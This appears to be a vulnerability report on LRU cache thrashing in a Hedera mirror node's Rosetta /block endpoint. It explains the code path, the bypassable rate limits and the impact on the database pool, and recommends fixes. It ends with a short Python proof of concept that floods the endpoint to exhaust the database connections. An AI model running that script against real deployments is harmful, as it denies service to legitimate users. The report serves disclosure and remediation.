### Title
LRU Cache Thrashing via Unauthenticated `/block` Requests Causes Repeated Database Queries in `updateOperationAccountAlias()`

### Summary
The `updateOperationAccountAlias()` function in `rosetta/app/services/block_service.go` uses a shared LRU `entityCache` (default capacity 524,288) to avoid repeated `GetAccountAlias()` database calls. Because the `/block` endpoint requires no authentication and has no application-level rate limiting, an unprivileged attacker can cycle through blocks containing many distinct account IDs to continuously evict cached entries and force unbounded repeated SQL queries against the database, degrading or denying service to legitimate users.

### Finding Description

**Exact code path:**

`rosetta/app/services/block_service.go`, `updateOperationAccountAlias()`, lines 104–130:

```go
accountId := operations[index].AccountId
if cached, found = s.entityCache.Get(accountId.GetId()); !found {
    result, err := s.accountRepo.GetAccountAlias(ctx, accountId)   // DB hit
    ...
    s.entityCache.Set(result.GetId(), result)
```

Every operation whose account ID is absent from the LRU cache triggers a synchronous call to `accountRepository.GetAccountAlias()`, which executes the raw SQL query:

```sql
select alias, id from entity where id = @id
```

(`rosetta/app/persistence/account.go`, line 51, `selectCryptoEntityWithAliasById`)

**Root cause and failed assumption:**

The cache is constructed as a pure capacity-bounded LRU with no TTL and no write-back protection:

```go
cache.AsLRU[int64, types.AccountId](lru.WithCapacity(entityCacheConfig.MaxSize))
```

(`block_service.go`, lines 34–37)

The design assumes the working set of account IDs fits within the cache. On any real network with millions of accounts this assumption fails: an attacker who rotates requests across blocks whose combined unique account IDs exceed the cache capacity (default 524,288) will continuously evict entries and force re-queries for the same accounts.

**Why existing checks are insufficient:**

The only rate-limiting controls are Traefik middleware entries in the Helm chart (`charts/hedera-mirror-rosetta/values.yaml`, lines 149–166):

```yaml
middleware:
  - inFlightReq:
      amount: 5
      sourceCriterion:
        ipStrategy:
          depth: 1
  - rateLimit:
      average: 10
      sourceCriterion:
        requestHost: true
```

These are:
1. **Optional** — only applied when `global.middleware` and `middleware` are both set; absent in bare deployments.
2. **Infrastructure-level only** — the Go application itself contains zero rate-limiting, authentication, or per-request operation-count guards.
3. **Bypassable** — `inFlightReq` is per source IP; a botnet or multiple IPs trivially bypasses it. `rateLimit` is per `requestHost` (the Host header), not per IP, so it is a global cap that a single attacker from multiple IPs can collectively saturate.

The `maxTransactionsInBlock` guard (`block_service.go`, lines 61–67) only caps how many transactions are returned in the response body; it does not limit the number of unique account IDs processed through `updateOperationAccountAlias()`.

### Impact Explanation

Each cache miss issues one synchronous DB query. The database connection pool is configured with `maxOpenConnections: 100` (`docs/configuration.md`, line 660). An attacker who drives sustained cache-miss rates can:

- Saturate the 100-connection pool, causing all subsequent DB operations (including those for legitimate users) to queue or time out.
- Increase database CPU and I/O load proportionally to the miss rate, potentially causing cascading failures across all mirror-node services sharing the same database.

Severity: **High** — unauthenticated, remotely exploitable, results in denial of service to all users of the Rosetta API and potentially the shared database.

### Likelihood Explanation

Preconditions are minimal:
- The attacker needs only network access to the Rosetta port (default 5700).
- No credentials, no special protocol knowledge beyond the public Rosetta spec.
- On mainnet/testnet, millions of accounts exist, making it trivial to identify blocks whose combined unique account IDs exceed the 524,288-entry cache.

The attack is repeatable and automatable with a simple script. Even a single machine can sustain enough requests to keep the cache in a thrashed state, because each `/block` response for a high-activity block can reference hundreds of unique account IDs.

### Recommendation

1. **Application-level rate limiting**: Add a per-IP (or global) request rate limiter directly in the Go HTTP server, independent of infrastructure middleware.
2. **Per-request operation cap**: Enforce a hard limit on the total number of unique account IDs resolved per request in `updateOperationAccountAlias()`, returning an error or truncating beyond the limit.
3. **Negative/bounded cache with TTL**: Add a TTL to cache entries so that even legitimate eviction does not create an unbounded re-query window; consider a separate negative-result cache to avoid re-querying non-existent accounts.
4. **DB query timeout enforcement**: Ensure `statementTimeout` (currently 20 s, `docs/configuration.md` line 662) is set aggressively and that the connection pool enforces a queue depth limit to shed load early.

### Proof of Concept

```python
import requests, itertools

ROSETTA = "http://<target>:5700"

# Pre-identify two sets of blocks whose combined unique account IDs > 524288
# (trivially found on mainnet by scanning high-activity blocks)
block_set_A = [{"index": i} for i in range(1, 501)]   # blocks with accounts 1..262144
block_set_B = [{"index": i} for i in range(501, 1001)] # blocks with accounts 262145..524289+

session = requests.Session()

for block in itertools.cycle(block_set_A + block_set_B):
    # Each request: cache miss for all account IDs in the block → DB query per account
    session.post(f"{ROSETTA}/block", json={
        "network_identifier": {"blockchain": "Hedera", "network": "mainnet"},
        "block_identifier": block
    })
    # No sleep needed; the Go server has no application-level rate limit
    # Rotating between block_set_A and block_set_B ensures LRU eviction of
    # set_A entries when set_B is processed, and vice versa, causing the
    # same account IDs to be re-queried on every cycle.
```

Expected result: database connection pool saturates within seconds; legitimate `/block`, `/account/balance`, and other endpoints begin timing out with `ErrDatabaseError`.
